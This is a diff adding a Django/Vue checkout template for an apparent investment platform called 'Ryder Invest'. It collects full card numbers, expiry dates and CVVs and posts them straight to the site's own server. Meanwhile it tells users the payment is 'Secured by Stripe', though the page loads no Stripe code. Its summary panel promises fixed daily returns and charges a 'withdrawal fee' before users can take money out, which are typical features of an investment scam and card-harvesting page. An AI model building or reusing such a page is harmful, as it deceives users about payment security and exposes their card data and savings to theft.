@@ -1,0 +1,256 @@
+{% load static %}
+{% load humanize %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Checkout | Ryder Invest</title>
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <link href="{% static 'css/vendor/carent-wbs.webflow.shared.15fbda294.css' %}" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" href="{% static 'base.css' %}">
+    <link rel="stylesheet" href="{% static 'contact/style.css' %}">
+    <link rel="stylesheet" href="{% static 'css/vendor/fonts.css' %}">
+    <link rel="stylesheet" href="{% static 'css/atm-card.css' %}">
+    <style>
+        body { background-color: #050505; color: #fff; font-family: 'Inter', sans-serif; }
+        .checkout-container { max-width: 1200px; margin: 40px auto; padding: 0 20px; display: grid; grid-template-columns: 1fr 400px; gap: 40px; }
+        @media (max-width: 991px) { .checkout-container { grid-template-columns: 1fr; } }
+        .card-form__button { background: #cc0000 !important; color: #fff !important; }
+        .card-form { background: #fff !important; box-shadow: 0 20px 40px -14px rgba(0,0,0,0.1) !important; color: #111 !important; }
+        .card-input__label { color: #111 !important; }
+        .card-input__input { border: 1px solid #ddd !important; color: #111 !important; }
+        .card-item__info { color: #fff !important; }
+        .summary-card { background: #fff; color: #000; border-radius: 24px; padding: 40px; position: sticky; top: 100px; }
+        .summary-row { display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 15px; }
+        .summary-row.total { border-top: 1px solid rgba(0,0,0,0.1); padding-top: 20px; margin-top: 20px; font-size: 20px; font-weight: 700; }
+        .summary-divider { height: 1px; background: rgba(0,0,0,0.1); margin: 20px 0; }
+    </style>
+</head>
+<body>
+    {% include 'partials/navbar.html' %}
+
+    <div style="padding-top: 120px; padding-bottom: 80px;">
+        <div class="checkout-container">
+            <!-- Left: Payment Form (Vue App) -->
+            <div>
+                <h3 style="font-size: 28px; font-weight: 700; margin-bottom: 10px; letter-spacing: -0.5px;">Payment Details</h3>
+                <p style="color: rgba(255,255,255,0.6); margin-bottom: 30px;">Complete your payment using our secure Stripe checkout.</p>
+
+                <div class="atm-wrapper" id="app">
+                    <div class="card-form">
+                      <div class="card-list">
+                        <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
+                          <div class="card-item__side -front">
+                            <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
+                            <div class="card-item__cover">
+                              <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg">
+                            </div>
+                            <div class="card-item__wrapper">
+                              <div class="card-item__top">
+                                <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" class="card-item__chip">
+                                <div class="card-item__type">
+                                  <transition name="slide-fade-up">
+                                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
+                                  </transition>
+                                </div>
+                              </div>
+                              <label for="cardNumber" class="card-item__number" ref="cardNumber">
+                                <template v-if="getCardType === 'amex'">
+                                 <span v-for="(n, $index) in amexCardMask" :key="$index">
+                                  <transition name="slide-fade-up">
+                                    <div class="card-item__numberItem" v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''">*</div>
+                                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" :key="$index" v-else-if="cardNumber.length > $index">{% verbatim %}{{cardNumber[$index]}}{% endverbatim %}</div>
+                                    <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" v-else :key="$index + 1">{% verbatim %}{{n}}{% endverbatim %}</div>
+                                  </transition>
+                                </span>
+                                </template>
+                                <template v-else>
+                                  <span v-for="(n, $index) in otherCardMask" :key="$index">
+                                    <transition name="slide-fade-up">
+                                      <div class="card-item__numberItem" v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''">*</div>
+                                      <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" :key="$index" v-else-if="cardNumber.length > $index">{% verbatim %}{{cardNumber[$index]}}{% endverbatim %}</div>
+                                      <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }" v-else :key="$index + 1">{% verbatim %}{{n}}{% endverbatim %}</div>
+                                    </transition>
+                                  </span>
+                                </template>
+                              </label>
+                              <div class="card-item__content">
+                                <label for="cardName" class="card-item__info" ref="cardName">
+                                  <div class="card-item__holder">Card Holder</div>
+                                  <transition name="slide-fade-up">
+                                    <div class="card-item__name" v-if="cardName.length" key="1">
+                                      <transition-group name="slide-fade-right">
+                                        <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{% verbatim %}{{n}}{% endverbatim %}</span>
+                                      </transition-group>
+                                    </div>
+                                    <div class="card-item__name" v-else key="2">Full Name</div>
+                                  </transition>
+                                </label>
+                                <div class="card-item__date" ref="cardDate">
+                                  <label for="cardMonth" class="card-item__dateTitle">Expires</label>
+                                  <label for="cardMonth" class="card-item__dateItem">
+                                    <transition name="slide-fade-up">
+                                      <span v-if="cardMonth" v-bind:key="cardMonth">{% verbatim %}{{cardMonth}}{% endverbatim %}</span>
+                                      <span v-else key="2">MM</span>
+                                    </transition>
+                                  </label>
+                                  /
+                                  <label for="cardYear" class="card-item__dateItem">
+                                    <transition name="slide-fade-up">
+                                      <span v-if="cardYear" v-bind:key="cardYear">{% verbatim %}{{String(cardYear).slice(2,4)}}{% endverbatim %}</span>
+                                      <span v-else key="2">YY</span>
+                                    </transition>
+                                  </label>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="card-item__side -back">
+                            <div class="card-item__cover">
+                              <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg">
+                            </div>
+                            <div class="card-item__band"></div>
+                            <div class="card-item__cvv">
+                                <div class="card-item__cvvTitle">CVV</div>
+                                <div class="card-item__cvvBand">
+                                  <span v-for="(n, $index) in cardCvv" :key="$index">*</span>
+                              </div>
+                                <div class="card-item__type">
+                                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" class="card-item__typeImg">
+                                </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="card-form__inner">
+                        {% if messages %}
+                        <div class="messages" style="margin-bottom: 20px;">
+                            {% for message in messages %}
+                            <div style="padding: 15px; border-radius: 8px; font-weight: 600; text-align: center; {% if message.tags == 'error' %}background: #ffeaeb; color: #cc0000; border: 1px solid #ffc2c5;{% else %}background: #e6f7eb; color: #008033; border: 1px solid #b3ebc6;{% endif %}">
+                                {{ message }}
+                            </div>
+                            {% endfor %}
+                        </div>
+                        {% endif %}
+                        <form method="POST" action="{{ pay_action }}" id="checkoutForm">
+                        {% csrf_token %}
+                        <div class="card-input">
+                          <label for="cardNumber" class="card-input__label">Card Number</label>
+                          <input type="text" id="cardNumber" name="card_number" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required>
+                        </div>
+                        <div class="card-input">
+                          <label for="cardName" class="card-input__label">Card Holders</label>
+                          <input type="text" id="cardName" name="card_name" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required>
+                        </div>
+                        <div class="card-form__row">
+                          <div class="card-form__col">
+                            <div class="card-form__group">
+                              <label for="cardMonth" class="card-input__label">Expiration Date</label>
+                              <select class="card-input__input -select" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
+                                <option value="" disabled selected>Month</option>
+                                <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n">{% verbatim %}{{n < 10 ? '0' + n : n}}{% endverbatim %}</option>
+                              </select>
+                              <select class="card-input__input -select" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
+                                <option value="" disabled selected>Year</option>
+                                <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n">{% verbatim %}{{$index + minCardYear}}{% endverbatim %}</option>
+                              </select>
+                              <input type="hidden" name="expiry" :value="(cardMonth ? cardMonth : '') + '/' + (cardYear ? String(cardYear).slice(2,4) : '')">
+                            </div>
+                          </div>
+                          <div class="card-form__col -cvv">
+                            <div class="card-input">
+                              <label for="cardCvv" class="card-input__label">CVV</label>
+                              <input type="text" class="card-input__input" id="cardCvv" name="cvv" v-mask="'####'" maxlength="4" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required>
+                            </div>
+                          </div>
+                        </div>
+
+                        <div style="margin-top: 15px; margin-bottom: 30px; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);">
+                            <label class="card-input__label" for="id_amount_to_pay" style="color:#fff !important;">Amount (USD)</label>
+                            <div style="position: relative;">
+                                <span style="position: absolute; left: 15px; top: 16px; color: #fff; font-weight: 600;">$</span>
+                                <input type="number" name="amount_to_pay" value="{{ amount }}" class="card-input__input" style="padding-left: 35px; {% if amount_locked %}background:rgba(255,255,255,0.08); cursor:not-allowed;{% endif %}" required id="id_amount_to_pay" {% if amount_locked %}readonly{% endif %}>
+                            </div>
+                            <p style="font-size: 12px; color: rgba(255,255,255,0.5); margin-top: 10px;">Secured by Stripe. Your card is charged in USD.</p>
+                        </div>
+
+                        <button class="card-form__button" id="submitBtn">
+                          Pay $<span id="payAmt">{{ amount|floatformat:2|intcomma }}</span>
+                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                        </button>
+                        </form>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right: Summary -->
+            <div>
+                <div class="summary-card">
+                    <h3 style="font-size: 20px; font-weight: 700; margin-bottom: 6px;">{{ pay_title }}</h3>
+                    <p style="color:#666; font-size:13px; margin-bottom:25px;">{{ pay_subtitle }}</p>
+
+                    {% if purpose == 'invest' %}
+                    <div style="display: flex; gap: 15px; margin-bottom: 25px;">
+                        <div style="width: 100px; height: 70px; border-radius: 8px; overflow: hidden; background: #f0f0f0;">
+                            {% if asset.image %}<img src="{{ asset.image.url }}" style="width: 100%; height: 100%; object-fit: cover;">{% endif %}
+                        </div>
+                        <div>
+                            <div style="font-weight: 700; font-size: 16px;">{{ asset.name }}</div>
+                            <div style="color: #666; font-size: 13px;">{{ asset.get_asset_type_display }}</div>
+                        </div>
+                    </div>
+                    <div class="summary-divider"></div>
+                    <div class="summary-row"><span style="color:#666;">Daily Return</span><span style="font-weight:600; color:#059669;">{{ asset.daily_return_percent }}%</span></div>
+                    <div class="summary-row"><span style="color:#666;">Contract</span><span style="font-weight:600;">{{ contract_months }} month{{ contract_months|pluralize }}</span></div>
+                    <div class="summary-row"><span style="color:#666;">Est. daily earning</span><span style="font-weight:600; color:#059669;">${{ daily_earning|floatformat:2|intcomma }}</span></div>
+                    <div class="summary-row"><span style="color:#666;">Est. total earnings</span><span style="font-weight:600; color:#059669;">${{ projected_total|floatformat:2|intcomma }}</span></div>
+                    <div class="summary-divider"></div>
+                    {% elif purpose == 'deposit' %}
+                    <div class="summary-row"><span style="color:#666;">Funding your wallet balance</span><span style="font-weight:600; color:#059669;">Add Funds</span></div>
+                    <p style="color:#888; font-size:12px; margin:6px 0 0;">These funds become available to invest in any asset. Enter the amount above.</p>
+                    <div class="summary-divider"></div>
+                    {% else %}
+                    <div class="summary-row"><span style="color:#666;">Cumulative withdrawal fee</span><span style="font-weight:600;">${{ amount|floatformat:2|intcomma }}</span></div>
+                    <div class="summary-divider"></div>
+                    {% endif %}
+
+                    <div class="summary-row total">
+                        <span>Total Due</span>
+                        <span style="color: #000;">${{ amount|floatformat:2|intcomma }}</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    {% include 'partials/footer.html' %}
+
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+    <script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+    <script src="{% static 'js/atm-card.js' %}"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('checkoutForm').addEventListener('submit', function() {
+                const btn = document.getElementById('submitBtn');
+                btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="animation: spin 1s linear infinite;"><line x1="12" y1="2" x2="12" y2="6"></line><line x1="12" y1="18" x2="12" y2="22"></line><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"></line><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"></line><line x1="2" y1="12" x2="6" y2="12"></line><line x1="18" y1="12" x2="22" y2="12"></line><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"></line><line x1="16.24" y1="4.93" x2="19.07" y2="7.76"></line></svg> Processing Securely...';
+                btn.style.opacity = '0.8';
+                btn.style.pointerEvents = 'none';
+            });
+            const style = document.createElement('style');
+            style.innerHTML = '@keyframes spin { 100% { transform: rotate(360deg); } }';
+            document.head.appendChild(style);
+
+            // Keep the "Pay $X" label in sync with the amount field (esp. for Add Funds)
+            var amt = document.getElementById('id_amount_to_pay');
+            var payAmt = document.getElementById('payAmt');
+            if (amt && payAmt) {
+                amt.addEventListener('input', function() {
+                    var v = parseFloat(amt.value) || 0;
+                    payAmt.textContent = v.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                });
+            }
+        });
+    </script>
+</body>
+</html>
